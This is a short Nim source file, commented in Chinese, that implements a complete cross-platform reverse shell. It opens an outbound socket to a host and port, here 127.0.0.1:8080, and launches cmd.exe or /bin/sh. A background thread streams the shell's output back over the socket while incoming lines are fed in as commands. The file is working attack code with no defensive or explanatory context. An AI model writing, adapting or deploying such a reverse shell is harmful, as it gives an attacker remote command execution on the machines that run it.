import std/[net, osproc, os, streams]

# 定义通道数据结构，用于线程间通信
type
  ShellContext = ref object
    socket: Socket
    processInput: Stream
    processOutput: Stream

proc readProcessOutput(ctx: ShellContext) {.thread.} =
  ## 线程 1：负责死循环读取进程输出，并发送给 Socket
  var buffer = newString(4096)
  while true:
    try:
      # 使用 readDataStr 代替 readAll，它有多少读多少，不会死等 EOF
      let bytesRead = ctx.processOutput.readDataStr(buffer, 0..4095)
      if bytesRead > 0:
        ctx.socket.send(buffer[0..<bytesRead])
      else:
        sleep(10) # 没数据时稍微休息
    except:
      break

proc handleSocketInput(ctx: ShellContext) =
  ## 主线程：负责从 Socket 接收命令，并写入进程
  var command = ""
  while true:
    try:
      ctx.socket.readLine(command)
      if command.len >= 0:
        ctx.processInput.write(command & "\n")
        ctx.processInput.flush()
    except:
      break

proc reverseShell(host: string, port: Port) =
  var socket = newSocket()
  try:
    socket.connect(host, port)
    
    when defined(windows):
      const shellCmd = "cmd.exe"
    else:
      const shellCmd = "/bin/sh"

    # 启动子进程
    var process = startProcess(shellCmd, options = {poUsePath, poStdErrToStdOut})
    
    let ctx = ShellContext(
      socket: socket,
      processInput: process.inputStream(),
      processOutput: process.outputStream()
    )

    # 创建独立线程专门负责读进程回显
    var outputThread: Thread[ShellContext]
    createThread(outputThread, readProcessOutput, ctx)

    # 主线程负责堵塞监听网络输入
    handleSocketInput(ctx)

    # 清理
    joinThread(outputThread)
    process.close()
  except:
    discard
  finally:
    socket.close()

when isMainModule:
  let targetIP = "127.0.0.1" 
  let targetPort = Port(8080)
  reverseShell(targetIP, targetPort)
